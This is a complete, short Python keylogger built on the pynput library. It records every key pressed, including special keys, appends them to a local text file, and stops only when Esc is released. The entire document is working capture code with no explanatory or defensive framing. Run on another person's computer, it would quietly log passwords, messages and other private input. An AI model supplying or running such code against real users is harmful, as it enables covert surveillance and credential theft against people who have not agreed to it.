import pynput
from pynput.keyboard import Key, Listener

# File to save the logged keys
log_file = "key_log.txt"

def on_press(key):
    try:
        # Save printable characters (letters, digits, and symbols)
        with open(log_file, "a") as file:
            file.write(key.char)
    except AttributeError:
        # Handle special keys (e.g., shift, enter, etc.)
        with open(log_file, "a") as file:
            file.write(f" [{key}] ")

def on_release(key):
    # Stop listener when 'Esc' key is released
    if key == Key.esc:
        print("Logging stopped.")
        return False

# Start listening to keyboard events
if __name__ == "__main__":
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
